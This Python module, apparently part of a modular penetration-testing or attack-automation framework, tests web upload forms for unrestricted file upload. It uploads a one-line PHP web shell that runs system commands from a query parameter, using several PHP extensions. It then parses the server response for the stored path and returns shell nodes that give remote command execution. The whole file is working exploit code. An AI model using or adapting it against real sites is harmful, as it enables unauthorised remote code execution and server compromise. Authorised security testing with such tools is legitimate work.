#!/usr/bin/env python3

import sys
sys.path.append('..')

from transformators.transformator import Transformator
from nodes.simple_http_shell import SimpleHTTPShell
from nodes.http_endpoint import HTTPEndpoint
from utils import gen_hexstring
import requests
import io


class ChechUnrestrictedFileUpload(Transformator):
    name = 'check unrestricted file upload'
    input_node = "HTTPUploadForm"

    @staticmethod
    def transform(node):
        extensions = ['.php', '.phtml', '.php5']
        output_nodes = []
        for i in range(len(extensions)):
            filename = gen_hexstring() + extensions[i]
            files = {
                node.content[2]: (filename, io.StringIO("<?php system($_GET['q']);"))
            }
            data = {}
            for param in node.content[1]:
                if param['name'] != node.content[2] and param['value'] is not None:
                    data[param['name']] = param['value']
            res = requests.post(str(node.content[0]), files=files, data=data)
            if filename in res.text:
                ind = res.text.find(filename)
                sind = ind
                while res.text[ind] not in ["'", '""']:
                    ind -= 1
                ind += 1
                path = res.text[ind:sind+len(filename)]
                output_nodes.append(SimpleHTTPShell(HTTPEndpoint(node.content[0].content[0], node.content[0].content[1] + path)))
        return output_nodes
